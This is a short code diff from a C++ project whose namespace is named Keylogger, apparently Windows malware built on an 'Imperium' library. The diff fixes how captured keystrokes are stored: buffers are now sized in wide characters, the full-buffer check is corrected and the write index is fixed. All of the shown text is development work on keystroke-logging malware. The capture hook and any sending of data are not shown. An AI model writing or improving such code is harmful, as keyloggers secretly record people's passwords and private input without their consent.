@@ -340,7 +340,7 @@ namespace Keylogger {
             //
             while ( ( *Keystrokes )->Next && ( Keystrokes = &( *Keystrokes )->Next ) );
 
-            if ( ( *Keystrokes )->Keys.MaximumLength == ( *Keystrokes )->Keys.Length ) {
+            if ( ( ( *Keystrokes )->Keys.MaximumLength - sizeof( WCHAR ) ) == ( *Keystrokes )->Keys.Length ) {
                 //
                 // that structure is full allocate a new one
                 //
@@ -361,14 +361,15 @@ namespace Keylogger {
             //
             // allocate memory for the buffer
             //
-            ( *Keystrokes )->Keys.MaximumLength = 100;
-            ( *Keystrokes )->Keys.Buffer        = Imperium::mem::alloc( 100 );
+            ( *Keystrokes )->Keys.MaximumLength = 100 * sizeof( WCHAR );
+            ( *Keystrokes )->Keys.Buffer        = Imperium::mem::alloc( ( *Keystrokes )->Keys.MaximumLength );
         }
 
         //
         // store that character
         //
-        ( *Keystrokes )->Keys.Buffer[ ( *Keystrokes )->Keys.Length++ ] = Character;
+        ( *Keystrokes )->Keys.Buffer[ ( *Keystrokes )->Keys.Length / 2 ] = Character;
+        ( *Keystrokes )->Keys.Length += sizeof( WCHAR );
     }
 
     /*!
